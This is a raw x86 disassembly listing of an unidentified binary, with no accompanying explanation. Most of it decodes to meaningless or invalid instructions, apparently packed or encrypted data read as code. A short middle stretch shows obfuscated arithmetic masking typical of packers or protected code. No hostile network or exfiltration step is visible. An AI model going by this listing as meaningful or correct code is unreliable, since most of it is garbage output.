  4132ed:	adc    ch,BYTE PTR [ebp-0x2e49ee71]
  4132f3:	fimul  DWORD PTR [edx-0x4dbe92aa]
  4132f9:	and    edx,edi
  4132fb:	mul    BYTE PTR [edx-0x62]
  4132fe:	test   BYTE PTR [edx-0x73],ch
  413301:	adc    DWORD PTR [eax-0x64],edi
  413304:	retf   
  413305:	sahf   
  413306:	adc    cl,BYTE PTR [ebx-0x78]
  413309:	push   0x42
  41330b:	mov    al,ds:0x5a781efc
  413310:	stos   BYTE PTR es:[edi],al
  413311:	push   ss
  413312:	fnsetpm(287 only) 
  413314:	leave  
  413315:	mov    ecx,0xc1a6d3d4
  41331a:	scas   eax,DWORD PTR es:[edi]
  41331b:	mov    ebx,0x7ec454f4
  413320:	jmp    0x251126e4
  413325:	inc    edx
  413326:	stc    
  413327:	pop    ebp
  413328:	mov    BYTE PTR ds:0xa74d3aec,dl
  41332e:	and    DWORD PTR [esi],esp
  413330:	lock rol DWORD PTR [esi],cl
  413333:	leave  
  413334:	cmp    DWORD PTR [esi],esi
  413336:	sahf   
  413337:	cs sub al,0xdf
  41333a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333b:	adc    dh,cl
  41333d:	and    edx,DWORD PTR [esi+0xa2b6aa5]
  413343:	das    
  413344:	jbe    0x4132df
  413346:	xchg   edx,eax
  413347:	rcr    BYTE PTR [eax+0x3de545a3],cl
  41334d:	sbb    eax,0x6a58d3be
  413352:	ficomp WORD PTR [eax+0x7b]
  413355:	(bad)  
  413356:	jb     0x413384
  413358:	push   edx
  413359:	popf   
  41335a:	dec    eax
  41335b:	les    ecx,FWORD PTR [esi+0x45]
  41335e:	in     eax,dx
  41335f:	cs pop ds
  413361:	loopne 0x41333b
  413363:	jmp    0xa5e33c96
  413368:	and    dl,bl
  41336a:	test   ah,dh
  41336c:	mov    ebp,es
  41336e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41336f:	outs   dx,BYTE PTR ds:[esi]
  413370:	bnd gs ja 0x4133c2
  413374:	ins    BYTE PTR es:[edi],dx
  413375:	imul   ecx,DWORD PTR [edx-0x68],0xc37ed09a
  41337c:	enter  0xb790,0x7a
  413380:	inc    ebx
  413381:	test   BYTE PTR [ecx-0x6d],dl
  413384:	push   ecx
  413385:	mov    ?,eax
  413387:	jns    0x4133fe
  413389:	pop    DWORD PTR [ebp-0x56]
  41338c:	mov    esi,0xc2f7a553
  413391:	jg     0x4133ab
  413393:	lods   al,BYTE PTR ds:[esi]
  413394:	mov    eax,ds:0xbbf653b1
  413399:	test   edx,esp
  41339b:	push   ss
  41339c:	cmp    BYTE PTR [ebx-0x257c9cdc],al
  4133a2:	xor    al,0x42
  4133a4:	xchg   ebx,eax
  4133a5:	stos   DWORD PTR es:[edi],eax
  4133a6:	imul   eax,ebx,0x9da7ad6d
  4133ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ad:	inc    ecx
  4133ae:	fbld   TBYTE PTR ds:0x269f5c55
  4133b4:	add    BYTE PTR [edi+0x489c7350],cl
  4133ba:	pop    ds
  4133bb:	lds    edx,FWORD PTR [edx-0x46]
  4133be:	enter  0x77dc,0xc
  4133c2:	fistp  QWORD PTR [edx-0x5e]
  4133c5:	cmp    al,0xad
  4133c7:	add    edx,ecx
  4133c9:	outs   dx,DWORD PTR ds:[esi]
  4133ca:	test   DWORD PTR [ebp+0x60],eax
  4133cd:	mul    DWORD PTR [edi+0x58]
  4133d0:	xchg   edx,eax
  4133d1:	adc    ebx,DWORD PTR ds:0x7b7e764e
  4133d7:	call   0x1d54469c
  4133dc:	cmp    eax,0xefbad47
  4133e1:	jne    0x413376
  4133e3:	vmwrite esi,DWORD PTR [eax-0x51]
  4133e7:	dec    eax
  4133e8:	push   ebp
  4133e9:	gs xchg ecx,eax
  4133eb:	jne    0x413410
  4133ed:	in     eax,0xff
  4133ef:	jl     0x4133a3
  4133f1:	popf   
  4133f2:	int    0x1b
  4133f4:	das    
  4133f5:	inc    esp
  4133f6:	inc    ecx
  4133f7:	js     0x41340b
  4133f9:	out    dx,al
  4133fa:	adc    eax,0x79ddf81d
  4133ff:	push   es
  413400:	les    ebp,FWORD PTR [ecx+0x18]
  413403:	aam    0x4c
  413405:	rol    BYTE PTR [eax-0xe],1
  413408:	dec    ebx
  413409:	and    BYTE PTR [edi+0x55],0x9f
  41340d:	jnp    0x41346f
  41340f:	in     al,dx
  413410:	sbb    al,0x5a
  413412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413414:	mov    cl,0xb4
  413416:	stos   DWORD PTR es:[edi],eax
  413417:	dec    ecx
  413418:	xor    DWORD PTR [edi],esp
  41341a:	mul    ebp
  41341c:	adc    eax,0xa21e2447
  413421:	cmp    BYTE PTR [esi+0xa],ch
  413424:	in     al,dx
  413425:	stc    
  413426:	retf   0xac69
  413429:	sti    
  41342a:	cmovs  edi,edi
  41342d:	sub    eax,0x3f85e208
  413432:	mov    ds:0x81a1fe5c,al
  413437:	fld    QWORD PTR [ebx]
  413439:	arpl   cx,cx
  41343b:	and    edi,DWORD PTR [ebp+0x21571acb]
  413441:	lds    esi,FWORD PTR [edi]
  413443:	dec    edi
  413444:	pop    ebx
  413445:	adc    DWORD PTR [ecx-0x73802e29],ebp
  41344b:	aas    
  41344c:	cwde   
  41344d:	inc    edi
  41344e:	sub    DWORD PTR [edx-0x63e7942b],0x54
  413455:	hlt    
  413456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413457:	adc    eax,0xe8785492
  41345c:	adc    al,0x55
  41345e:	ss pop esp
  413460:	int3   
  413461:	jmp    0x284f:0x615396e8
  413468:	repz dec edx
  41346a:	aaa    
  41346b:	cli    
  41346c:	leave  
  41346d:	cmp    BYTE PTR [eax+0x2bd604cc],al
  413473:	aam    0x61
  413475:	or     eax,0xf4fda093
  41347a:	jge    0x4134af
  41347c:	ins    DWORD PTR es:[edi],dx
  41347d:	cs and esi,eax
  413480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413481:	std    
  413482:	(bad)  
  413484:	pusha  
  413485:	ds push ds
  413487:	pusha  
  413488:	mov    dh,bh
  41348a:	cs push 0xdd1bde8a
  413490:	es xchg dx,ax
  413493:	xchg   ebx,eax
  413494:	(bad)  
  413495:	(bad)  
  413496:	int3   
  413497:	(bad)  
  413498:	call   0xa592:0xa723f451
  41349f:	xchg   DWORD PTR [edi+0x6c],esp
  4134a2:	and    dl,BYTE PTR [eax+0x7706bb3f]
  4134a8:	in     al,0x90
  4134aa:	mov    BYTE PTR [eax-0x47e25c9c],ch
  4134b0:	js     0x41350d
  4134b2:	(bad)  
  4134b3:	push   ebx
  4134b4:	mov    ds:0xe7573a0f,eax
  4134b9:	pusha  
  4134ba:	or     al,0xe6
  4134bc:	xor    dh,BYTE PTR [ebx]
  4134be:	sub    BYTE PTR cs:[edi],0x9
  4134c2:	(bad)  
  4134c3:	(bad)  
  4134c4:	in     eax,0x5c
  4134c6:	dec    sp
  4134c8:	pop    es
  4134c9:	jb     0x4134e1
  4134cb:	out    dx,eax
  4134cc:	inc    ebp
  4134cd:	and    ecx,edx
  4134cf:	mov    ch,0x94
  4134d1:	and    al,0x6f
  4134d3:	popf   
  4134d4:	sbb    al,0xc7
  4134d6:	xchg   ebp,eax
  4134d7:	nop
  4134d8:	add    BYTE PTR [esi],ch
  4134da:	cmp    DWORD PTR [esi],esi
  4134dc:	arpl   WORD PTR [ebx],dx
  4134de:	sbb    ah,ch
  4134e0:	dec    ecx
  4134e1:	push   ds
  4134e2:	add    DWORD PTR [edx],ebx
  4134e4:	cmp    DWORD PTR [esp+esi*4],ebp
  4134e7:	ss loopne 0x4134db
  4134ea:	mov    ds:0x82d22af8,al
  4134ef:	iret   
  4134f0:	sub    DWORD PTR [eax+ebp*4+0x20],0x5921cc6e
  4134f8:	adc    eax,0xbe109437
  4134fd:	(bad)  [edx]
  4134ff:	jmp    0x4134b2
  413501:	jae    0x4134d4
  413503:	call   0xb784df28
  413508:	sbb    ebp,DWORD PTR [eax-0x5a]
  41350b:	enter  0xebc3,0xf3
  41350f:	add    eax,0x97b956d2
  413514:	lds    eax,FWORD PTR [ecx]
  413516:	scas   eax,DWORD PTR es:[edi]
  413517:	fisttp QWORD PTR [ecx]
  413519:	(bad)  
  41351a:	call   0x75823196
  41351f:	mov    BYTE PTR [edx],dh
  413521:	das    
  413522:	enter  0x12fe,0xcd
  413526:	mov    DWORD PTR [ecx],esi
  413528:	fisub  DWORD PTR [esi+edx*1+0x3a]
  41352c:	icebp  
  41352d:	je     0x413548
  41352f:	xor    al,0x95
  413531:	data16 jge 0x413550
  413534:	cdq    
  413535:	cmp    bl,BYTE PTR [edx]
  413537:	aas    
  413538:	dec    edi
  413539:	fcmovb st,st(5)
  41353b:	cmp    esp,DWORD PTR [edi+0x3e40839b]
  413541:	stos   BYTE PTR es:[edi],al
  413542:	dec    esp
  413543:	int3   
  413544:	mov    ecx,0x81f129f9
  413549:	ds or  al,0x3c
  41354c:	lea    edi,[ebp-0x6d2acd96]
  413552:	adc    ecx,0x4e1e85a9
  413558:	push   ds
  413559:	js     0x413554
  41355b:	dec    ebx
  41355c:	jmp    0xdda9f318
  413561:	stos   BYTE PTR es:[edi],al
  413562:	shl    dh,0x9
  413565:	in     al,0x99
  413567:	jne    0x413517
  413569:	ss jns 0x413563
  41356c:	pop    esi
  41356d:	stos   BYTE PTR es:[edi],al
  41356e:	ds fs cwde 
  413571:	jl     0x4135d3
  413573:	dec    ecx
  413574:	ret    0xe72
  413577:	bound  esi,QWORD PTR [esi+0x28]
  41357a:	xchg   ebx,eax
  41357b:	ret    
  41357c:	cmc    
  41357d:	adc    edi,eax
  41357f:	fidiv  DWORD PTR ds:0x274d03d7
  413585:	stc    
  413586:	xor    bh,BYTE PTR [esi]
  413588:	popf   
  413589:	cmp    BYTE PTR [ebp+eax*1+0x35ee8ad4],bl
  413590:	mov    ch,0xb9
  413592:	dec    ebp
  413593:	xchg   ebx,eax
  413594:	dec    WORD PTR [ebx+0x1e433fd1]
  41359b:	fisub  WORD PTR [edi-0x5699de18]
  4135a1:	loop   0x4135b1
  4135a3:	mov    DWORD PTR [ecx+0x4788e726],eax
  4135a9:	sub    bh,BYTE PTR [ecx]
  4135ab:	inc    ebp
  4135ac:	mov    eax,ds:0x658f6499
  4135b1:	icebp  
  4135b2:	mov    eax,ds:0xc2195f33
  4135b7:	jne    0x413600
  4135b9:	nop
  4135ba:	retf   
  4135bb:	push   es
  4135bc:	dec    edx
  4135bd:	sbb    edi,DWORD PTR [edx-0x53d7a6ad]
  4135c3:	dec    eax
  4135c4:	(bad)  [eax-0x54a7c06e]
  4135ca:	cli    
  4135cb:	inc    edx
  4135cc:	mov    edi,0xa048b0f6
  4135d1:	call   0x879f:0x54e08558
  4135d8:	adc    DWORD PTR [esi+0x6f173b31],ebx
  4135de:	shl    BYTE PTR [ebp+edi*8+0x16525e23],1
  4135e5:	mov    BYTE PTR [esi],dh
  4135e7:	ror    bl,0xa8
  4135ea:	inc    ebx
  4135eb:	or     eax,0x3206bbd4
  4135f0:	push   ecx
  4135f1:	lahf   
  4135f2:	jl     0x413635
  4135f4:	out    dx,eax
  4135f5:	jo     0x413601
  4135f7:	cmp    BYTE PTR [eax-0x273d1239],0xfd
  4135fe:	push   esi
  4135ff:	(bad)
  413602:	and    ch,cl
  413604:	pop    ebx
  413605:	loopne 0x413681
  413607:	mov    ch,0x7
  413609:	mov    edx,0xed07941a
  41360e:	das    
  41360f:	jb     0x41366e
  413611:	jb     0x413663
  413613:	pop    esi
  413614:	xchg   ebp,eax
  413615:	mov    dl,0x31
  413617:	ds adc cl,0x4d
  41361b:	nop
  41361c:	lds    edi,FWORD PTR [ecx-0x45]
  41361f:	push   ebx
  413620:	dec    esp
  413621:	adc    BYTE PTR [ecx-0x67],ah
  413624:	push   ss
  413625:	add    ch,dl
  413627:	sub    al,0x9f
  413629:	cdq    
  41362a:	hlt    
  41362b:	dec    edx
  41362c:	mov    BYTE PTR [ebx-0x49ac1498],bl
  413632:	pop    edx
  413633:	pop    ebp
  413634:	mov    eax,DWORD PTR [ebx]
  413636:	sahf   
  413637:	call   0x9900d408
  41363c:	repz inc ebp
  41363e:	mov    ebx,0x60734e3a
  413643:	shl    BYTE PTR [ecx-0x105ff4c3],1
  413649:	sbb    BYTE PTR [ecx-0x4dd41cec],0x2e
  413650:	sti    
  413651:	jge    0x413638
  413653:	in     eax,0x68
  413655:	(bad)  
  413656:	loope  0x413693
  413658:	mov    DWORD PTR [esi+0x7403bf36],ecx
  41365e:	pop    es
  41365f:	scas   eax,DWORD PTR es:[edi]
  413660:	into   
  413661:	mov    ebp,0xc638a9e5
  413666:	push   ebp
  413667:	scas   al,BYTE PTR es:[edi]
  413668:	adc    DWORD PTR [ecx-0x31],eax
  41366b:	dec    edx
  41366c:	(bad)  
  41366d:	xor    ah,BYTE PTR [ebx+0xdc8d78f]
  413673:	xor    eax,0xb059dfe5
  413678:	scas   eax,DWORD PTR es:[edi]
  413679:	sub    cl,al
  41367b:	sbb    eax,0x207b488f
  413680:	dec    ecx
  413681:	adc    bh,dh
  413683:	lods   al,BYTE PTR ds:[esi]
  413684:	cmp    DWORD PTR [eax+esi*4+0x64889dda],ecx
  41368b:	ins    BYTE PTR es:[edi],dx
  41368c:	loopne 0x4136e5
  41368e:	loop   0x4136bc
  413690:	sar    BYTE PTR [edi+0x31],0x83
  413694:	and    eax,0x4f0cfecd
  413699:	or     DWORD PTR [edx-0x26d875b7],esp
  41369f:	jp     0x4136bd
  4136a1:	and    al,0xdf
  4136a3:	fnsave [ecx+0x7c]
  4136a6:	out    0x68,eax
  4136a8:	mov    eax,ds:0x1b8003d2
  4136ad:	xor    DWORD PTR [edx+0x1b4abe7a],eax
  4136b3:	bnd jg 0x413637
  4136b6:	es jecxz 0x4136db
  4136b9:	add    DWORD PTR [ebp-0x42],0x7436aea9
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xae
  413798:	fisttp QWORD PTR [ecx]
  41379a:	add    esp,DWORD PTR [edx-0x329d9d95]
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0x1e]
  4137a4:	iret   
  4137a5:	test   al,0xbd
  4137a7:	(bad)  
  4137aa:	call   eax
  4137ac:	out    dx,al
  4137ad:	pop    edx
  4137ae:	add    BYTE PTR [ecx-0x4e],0x4b
  4137b2:	sbb    ecx,DWORD PTR [edx-0x2a]
  4137b5:	inc    esi
  4137b6:	jne    0x413771
  4137b8:	inc    eax
  4137b9:	xchg   edi,eax
  4137ba:	jmp    0x27fd28d8
  4137bf:	or     al,0xc9
  4137c1:	fcomi  st,st(1)
  4137c3:	sar    DWORD PTR [ebx-0x35],1
  4137c6:	jmp    0x773a:0x9409e88f
  4137cd:	test   eax,0xbb08d3c4
  4137d2:	mov    cl,0x65
  4137d4:	xchg   ecx,eax
  4137d5:	push   ebp
  4137d6:	lock std 
  4137d8:	mov    edx,0x5d099bc2
  4137dd:	in     eax,0x5a
  4137df:	mov    eax,ds:0x130c8968
  4137e4:	jne    0x413846
  4137e6:	and    esp,ebp
  4137e8:	xor    al,0x1
  4137ea:	inc    edx
  4137eb:	pop    edi
  4137ec:	stc    
  4137ed:	pop    sp
  4137ef:	jmp    0xcb6e:0x9c170895
  4137f6:	ss dec eax
  4137f8:	xchg   edx,eax
  4137f9:	xchg   ecx,eax
  4137fa:	scas   eax,DWORD PTR es:[edi]
  4137fb:	push   edx
  4137fc:	mov    bh,0x70
  4137fe:	pop    ebx
  4137ff:	div    dh
  413801:	rol    DWORD PTR [ebp-0x74],cl
  413804:	sar    DWORD PTR [eax],1
  413806:	dec    esp
  413807:	scas   eax,DWORD PTR es:[edi]
  413808:	clc    
  413809:	jmp    0x46f9:0xc1d5e1c2
  413810:	xor    DWORD PTR [edi],ebp
  413812:	adc    dl,0x96
  413815:	inc    esi
  413816:	pop    es
  413817:	dec    ebx
  413818:	xor    DWORD PTR [edx],edi
  41381a:	(bad)  
  41381b:	lahf   
  41381c:	mov    al,ds:0xb09128ae
  413821:	iret   
  413822:	fild   DWORD PTR [eax+0x23]
  413825:	inc    esi
  413826:	aam    0x7c
  413828:	shl    DWORD PTR [esi-0x7f],1
  41382b:	inc    edx
  41382c:	shl    DWORD PTR [ebp-0x7c787a9e],1
  413832:	push   edx
  413833:	push   cs
  413834:	pop    ebx
  413835:	mov    bh,0x52
  413837:	push   eax
  413838:	call   0x41d0:0x932695ca
  41383f:	and    al,0x5f
  413841:	mov    cl,BYTE PTR [edi-0x6b]
  413844:	mov    DWORD PTR ss:[ecx],edi
  413847:	dec    edi
  413848:	js     0x4137db
  41384a:	ins    DWORD PTR es:[edi],dx
  41384b:	cwde   
  41384c:	pusha  
  41384d:	imul   BYTE PTR [eax+0x77cf144e]
  413853:	mov    ebp,0x2c24a8f1
  413858:	cmp    al,0x7d
  41385a:	pop    eax
  41385b:	cmp    ecx,ebx
  41385d:	mov    edx,0x92a935f6
  413862:	pop    DWORD PTR [eax+0x1f]
  413865:	in     al,dx
  413866:	jns    0x413800
  413868:	iret   
  413869:	or     BYTE PTR [esi-0x16],dh
  41386c:	inc    esp
  41386d:	xchg   edx,eax
  41386e:	jg     0x413834
  413870:	aad    0x2
  413872:	lods   eax,DWORD PTR ds:[esi]
  413873:	mov    ebx,DWORD PTR [edi]
  413875:	loope  0x4138be
  413877:	leave  
  413878:	shr    eax,0x3e
  41387b:	retf   
  41387c:	rol    BYTE PTR [eax+eiz*2],0x88
  413880:	cdq    
  413881:	mov    ebp,0xffb79450
  413886:	fwait
  413887:	daa    
  413888:	leave  
  413889:	dec    esp
  41388a:	stos   BYTE PTR es:[edi],al
  41388b:	and    ecx,eax
  41388d:	call   0xeccf:0xda04b49d
  413894:	xlat   BYTE PTR ds:[ebx]
  413895:	pop    eax
  413896:	inc    edi
  413897:	mov    ch,0xc9
  413899:	loop   0x413879
  41389b:	jns    0x41384a
  41389d:	jg     0x413824
  41389f:	daa    
  4138a0:	gs ret 0x8740
  4138a4:	retf   0x590e
  4138a7:	sbb    esp,edx
  4138a9:	call   FWORD PTR [ecx]
  4138ab:	cmp    ebx,edx
  4138ad:	push   ds
  4138ae:	repnz ins BYTE PTR es:[edi],dx
  4138b0:	push   edx
  4138b1:	sbb    BYTE PTR [edi-0x6e932797],ah
  4138b7:	adc    al,cl
  4138b9:	mul    ebx
  4138bb:	add    al,0xb5
  4138bd:	dec    esp
  4138be:	mov    ds:0x457e340a,eax
  4138c3:	or     al,0x18
  4138c5:	in     al,dx
  4138c6:	pop    ss
  4138c7:	mov    ecx,0x9c3dfc9a
  4138cc:	mov    al,ds:0x4d397407
  4138d1:	cmc    
  4138d2:	in     al,dx
  4138d3:	cs mov ah,ah
  4138d6:	lea    esp,[eax+0x2c]
  4138d9:	sbb    ch,BYTE PTR [esp+edx*1+0x31ba0cce]
  4138e0:	push   cs
  4138e1:	pop    ds
  4138e2:	mov    bl,0x6e
  4138e4:	sbb    dh,bl
  4138e6:	test   BYTE PTR [edx],dl
  4138e8:	(bad)  
  4138e9:	dec    edi
  4138ea:	fsubr  DWORD PTR [esi-0x13]
  4138ed:	mov    al,0xd5
  4138ef:	in     al,dx
  4138f0:	jo     0x413903
  4138f2:	xchg   ch,bh
  4138f4:	jne    0x41387b
  4138f6:	push   cs
  4138f7:	inc    ebx
  4138f8:	aas    
  4138f9:	fdiv   st,st(7)
  4138fb:	in     al,dx
  4138fc:	(bad)  
  4138fe:	(bad)  
  4138ff:	adc    ebp,DWORD PTR [esi-0x3b]
  413902:	retf   
  413903:	pop    eax
  413904:	call   0x8bb8ef9b
  413909:	sar    BYTE PTR [ebp+0x40],cl
  41390c:	sbb    esi,DWORD PTR [esp+edi*8+0x39deb1e2]
  413913:	mov    ebp,0xe18e9d9b
  413918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413919:	test   eax,0x9d22191e
  41391e:	pop    ss
  41391f:	imul   ebp,DWORD PTR [ebx+0x8695ce6],0xf4855958
  413929:	pop    esp
  41392a:	jbe    0x41392b
  41392c:	fiadd  DWORD PTR [edx-0x73]
  41392f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413930:	f2xm1  
  413932:	ror    ecx,0xb
  413935:	adc    eax,0x485877f9
  41393a:	pop    esp
  41393b:	jns    0x41396d
  41393d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41393e:	mov    ebx,0xb49305d7
  413943:	mov    ecx,0x58139f86
  413948:	(bad)  
  413949:	sub    bl,al
  41394b:	ror    DWORD PTR [ebx+0x55],1
  41394e:	mov    al,0x67
  413950:	mov    bh,0xc8
  413952:	test   eax,0x6ae9706c
  413957:	jg     0x413993
  413959:	mov    bl,0x94
  41395b:	pop    edi
  41395c:	ret    0xb708
  41395f:	adc    DWORD PTR ds:0x311bc6df,0x40e7dd41
  413969:	sub    DWORD PTR [esi+eiz*4+0x45aee6be],0xffffffa4
  413971:	and    BYTE PTR [eax-0x1e],0x98
  413975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413976:	ins    DWORD PTR es:[edi],dx
  413977:	or     al,bl
  413979:	pop    eax
  41397a:	loope  0x413940
  41397c:	retf   
  41397d:	or     BYTE PTR [edi+0x54],ch
  413980:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  413982:	mov    bh,al
  413984:	fsub   DWORD PTR [ecx+edi*2-0x52775ca9]
  41398b:	xchg   dl,al
  41398d:	push   0xec59fb2b
  413992:	sbb    ecx,ebx
  413994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413995:	cmp    dh,BYTE PTR [edi]
  413997:	adc    esi,DWORD PTR ds:0x3032b849
  41399d:	fs pop esp
  41399f:	mov    ebp,0xd2b6f608
  4139a4:	dec    edx
  4139a5:	sub    eax,0x7d16334b
  4139aa:	or     dh,BYTE PTR [ebp+0x5ffe27cb]
  4139b0:	jae    0x4139d2
  4139b2:	push   ss
  4139b3:	cli    
  4139b4:	mov    bl,BYTE PTR [edi+ebp*8+0x53469822]
  4139bb:	popa   
  4139bc:	int    0xab
  4139be:	pop    DWORD PTR [esi+0x29]
  4139c1:	inc    ecx
  4139c2:	sub    dl,cl
  4139c4:	push   es
  4139c5:	imul   edx,ecx,0x3c
  4139c8:	xchg   bh,ah
  4139ca:	daa    
  4139cb:	mov    edi,0xda8ae4db
  4139d0:	add    DWORD PTR [esi+0x52],eax
  4139d3:	add    DWORD PTR [ebx-0x1bf6654e],ebx
  4139d9:	jmp    0x1bb836b8
  4139de:	les    esp,FWORD PTR [esi+0x4]
  4139e1:	push   ecx
  4139e2:	fwait
  4139e3:	test   BYTE PTR [edx+0x54],ch
  4139e6:	movd   mm0,DWORD PTR [esi-0x72]
  4139ea:	daa    
  4139eb:	aaa    
  4139ec:	leave  
  4139ed:	ss leave 
  4139ef:	clc    
  4139f0:	cmp    BYTE PTR [esi],dh
  4139f2:	hlt    
  4139f3:	mov    edx,0x780c0522
  4139f8:	lods   eax,DWORD PTR ds:[esi]
  4139f9:	push   0x60
  4139fb:	push   esi
  4139fc:	sub    ecx,DWORD PTR [ebp+0x2c834a36]
  413a02:	adc    eax,0xd55813db
  413a07:	ja     0x41399d
  413a09:	mov    ah,0xf6
  413a0b:	inc    ebp
  413a0c:	adc    al,0x22
  413a0e:	mov    ss,WORD PTR [ebp-0x40406aec]
  413a14:	leave  
  413a15:	add    ebx,esi
  413a17:	cmp    DWORD PTR [eax-0x2a],ecx
  413a1a:	fstp   TBYTE PTR [edi]
  413a1c:	ret    0x3326
  413a1f:	ret    0x3c2f
  413a22:	add    BYTE PTR [esi-0x5d4b491a],ch
  413a28:	(bad)  
  413a29:	sub    DWORD PTR [esi+ecx*8-0x1e384473],edi
  413a30:	xchg   ebx,eax
  413a31:	mov    ds:0xe54cdb50,eax
  413a36:	dec    ecx
  413a37:	into   
  413a38:	(bad)  
  413a39:	sar    BYTE PTR [ebx+0x3cf6cfa1],1
  413a3f:	mov    bl,BYTE PTR [edi-0x494af161]
  413a45:	stos   BYTE PTR es:[edi],al
  413a46:	sub    eax,0x8bc257db
  413a4b:	mov    esp,0x11657cdb
  413a50:	into   
  413a51:	inc    ecx
  413a52:	fs cmp esi,edx
  413a55:	xor    al,0x3
  413a57:	mov    ebx,ecx
  413a59:	dec    esi
  413a5a:	xchg   ebp,eax
  413a5b:	idiv   DWORD PTR [ebx+0x59316735]
  413a61:	pop    esp
  413a62:	jmp    0x413ab3
  413a64:	xor    eax,0x952e6388
  413a69:	(bad)  
  413a6b:	ja     0x413a33
  413a6d:	jae    0x413ac6
  413a6f:	jb     0x413a5d
  413a71:	sub    edx,DWORD PTR [eax-0x6a]
  413a74:	add    edx,DWORD PTR [esi+0x24b039b3]
  413a7a:	je     0x413af7
  413a7c:	test   BYTE PTR [eax],cl
  413a7e:	sub    al,0xe
  413a80:	inc    eax
  413a81:	iret   
  413a82:	xor    bh,ah
  413a84:	mov    bl,BYTE PTR [eax+ebp*4+0x2549fdc2]
  413a8b:	pop    ebx
  413a8c:	(bad)  
  413a8d:	jle    0x413a19
  413a8f:	mov    WORD PTR [esi-0xa],?
  413a92:	mov    bh,0x2d
  413a94:	lods   eax,DWORD PTR ds:[esi]
  413a95:	pop    edx
  413a96:	les    ecx,FWORD PTR [edi-0x57c17cbd]
  413a9c:	adc    al,0x11
  413a9e:	repnz das 
  413aa0:	push   ebx
  413aa1:	mov    esp,0x9dd2a979
  413aa6:	xor    bl,BYTE PTR [esi-0x1f]
  413aa9:	fsubp  st(6),st
  413aab:	cld    
  413aac:	ficomp DWORD PTR [ebp-0x7fd1c619]
  413ab2:	push   edi
  413ab3:	mov    al,ds:0xeecd65cc
  413ab8:	push   ss
  413ab9:	or     al,0x78
  413abb:	std    
  413abc:	adc    DWORD PTR [esi],ebp
  413abe:	shl    BYTE PTR [esi-0x74],cl
  413ac1:	push   ds
  413ac2:	stos   DWORD PTR es:[edi],eax
  413ac3:	out    0xb6,eax
  413ac5:	fild   DWORD PTR [esi+0x2a]
  413ac8:	in     eax,dx
  413ac9:	std    
  413aca:	mov    ecx,0xb0f3780d
  413acf:	inc    ebp
  413ad0:	fimul  DWORD PTR [ebx+0x19]
  413ad3:	pop    esp
  413ad4:	push   esi
  413ad5:	ds sub al,ah
  413ad8:	jae    0x413a69
  413ada:	cmp    ebp,edx
  413adc:	cmp    al,0x96
  413ade:	push   es
  413adf:	xor    ebp,DWORD PTR [eax-0x473272cd]
  413ae5:	inc    ebp
  413ae6:	pushf  
  413ae7:	adc    bh,bl
  413ae9:	stos   BYTE PTR es:[edi],al
  413aea:	lods   eax,DWORD PTR ds:[esi]
  413aeb:	rol    DWORD PTR [ecx],1
  413aed:	clc    
  413aee:	xchg   ebp,eax
  413aef:	mov    eax,ds:0x58325ebd
